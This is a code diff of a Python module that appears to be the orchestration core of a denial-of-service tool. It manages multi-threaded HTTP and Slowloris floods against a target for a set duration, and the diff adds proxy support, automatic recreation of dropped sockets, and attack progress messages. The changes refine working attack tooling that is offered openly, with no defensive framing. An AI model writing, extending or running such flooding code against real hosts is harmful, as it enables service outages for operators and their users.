@@ -6,15 +6,16 @@ import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Any, List, Union
+from typing import Callable, Dict, List, Tuple, Union
 
-from colorama import Fore  # type: ignore[import]
-from humanfriendly import Spinner, format_timespan  # type: ignore[import]
+from colorama import Fore
+from humanfriendly import Spinner, format_timespan
 
-from tools.ip_tools import create_socket, get_target_address  # type: ignore[import]
+from tools.addons.ip_tools import get_target_address
+from tools.addons.sockets import create_socket
 
 
-def get_method_by_name(method: str) -> Any:
+def get_method_by_name(method: str) -> Callable:
     """Get the flood function based on the attack method.
 
     Args:
@@ -23,8 +24,8 @@ def get_method_by_name(method: str) -> Any:
     Returns:
         - flood_function - The associated flood function
     """
-    dir = f"tools.L7.{method.lower()}"
-    module = __import__(dir, fromlist=["object"])
+    directory = f"tools.L7.{method.lower()}"
+    module = __import__(directory, fromlist=["object"])
     flood_function = getattr(module, "flood")
     return flood_function
 
@@ -57,8 +58,7 @@ class AttackMethod:
         self.target = target
         self.use_proxy = use_proxy
         self.sleep_time = sleep_time
-        self.threads = list()  # type: List[Thread]
-        self.sockets = list()  # type: List[socket.SocketType]
+        self.threads = []  # type: List[Thread]
         self.is_running = False
 
     def __enter__(self) -> AttackMethod:
@@ -67,39 +67,49 @@ class AttackMethod:
         self.target = get_target_address(self.target)
         return self
 
-    def __exit__(self, exc_type, exc_value, traceback) -> None:  # type: ignore
+    def __exit__(self, exc_type, exc_value, traceback) -> None:
         """Do nothing, only for context manager."""
-        pass
 
     def __run_timer(self) -> None:
         """Verify the execution time every second."""
-        __stopTime = time() + self.duration
-        while time() < __stopTime:
+        __stop_time = time() + self.duration
+        while time() < __stop_time:
             sleep(1)
         self.is_running = False
 
-    def __run_flood(self, sock: Union[socket.SocketType, None] = None) -> None:
+    def __run_flood(
+        self, *args: Tuple[socket.socket, Union[Dict[str, str], None]]
+    ) -> None:
         """Start the flooder."""
         while self.is_running:
-            if sock:
-                self.method(sock)
-                sleep(self.sleep_time)
-            else:
+            try:
+                if args[0]:
+                    try:
+                        self.method(args[0], args[1])
+                    except (ConnectionResetError, BrokenPipeError):
+                        sock, proxy = create_socket(self.target, self.use_proxy)
+                        self.thread = Thread(
+                            target=self.__run_flood, args=(sock, proxy)
+                        )
+                        self.thread.start()
+                    else:
+                        sleep(self.sleep_time)
+            except IndexError:
                 self.method(self.target, self.use_proxy)
 
     def __run_threads(self) -> None:
         """Initialize the threads."""
-        timing = Thread(target=self.__run_timer)
-        timing.start()
-
         if self.method_name.lower() == "slowloris":
-            self.sockets = [
-                create_socket(self.target) for _ in range(self.threads_count)
-            ]
-            self.threads = [
-                Thread(target=self.__run_flood, args=(self.sockets[i],))
-                for i in range(self.threads_count)
-            ]
+            with Spinner(
+                label=f"{Fore.YELLOW}Creating Sockets...{Fore.RESET}",
+                total=100,
+            ) as spinner:
+                for i in range(self.threads_count):
+                    sock, proxy = create_socket(self.target, self.use_proxy)
+                    self.threads.append(
+                        Thread(target=self.__run_flood, args=(sock, proxy))
+                    )
+                    spinner.step(100 / self.threads_count * (i + 1))
         else:
             self.threads = [
                 Thread(target=self.__run_flood) for _ in range(self.threads_count)
@@ -110,14 +120,15 @@ class AttackMethod:
             total=100,
         ) as spinner:
             for index, thread in enumerate(self.threads):
-                thread.start()
+                self.thread = thread
+                self.thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
+
+        timer = Thread(target=self.__run_timer)
+        timer.start()
 
         for index, thread in enumerate(self.threads):
             thread.join()
-            print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
-            )
 
         print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
 
@@ -126,9 +137,17 @@ class AttackMethod:
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
-            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
+            f"{Fore.MAGENTA}\n[!] {Fore.BLUE}Attacking {Fore.MAGENTA}{target}{Fore.BLUE} using {Fore.MAGENTA}{self.method_name.upper()}{Fore.BLUE} method. {Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n{Fore.RESET}"
         )
+        if self.method_name.lower() == "slowloris":
+            print(
+                f"{Fore.MAGENTA}[!] {Fore.BLUE}Sockets that eventually went down are automatically recreated!\n\n{Fore.RESET}"
+            )
+        elif self.method_name.lower() == "http":
+            if self.use_proxy:
+                print(
+                    f"{Fore.MAGENTA}[!] {Fore.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{Fore.RESET}"
+                )
 
         self.is_running = True
 
@@ -138,7 +157,7 @@ class AttackMethod:
         except KeyboardInterrupt:
             self.is_running = False
             print(
-                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads...\n\n{Fore.RESET}"
+                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping Attack...{Fore.RESET}"
             )
 
             for thread in self.threads:
@@ -149,3 +168,6 @@ class AttackMethod:
                 f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
             )
             sys.exit(1)
+        except Exception:
+            return False
+        return True
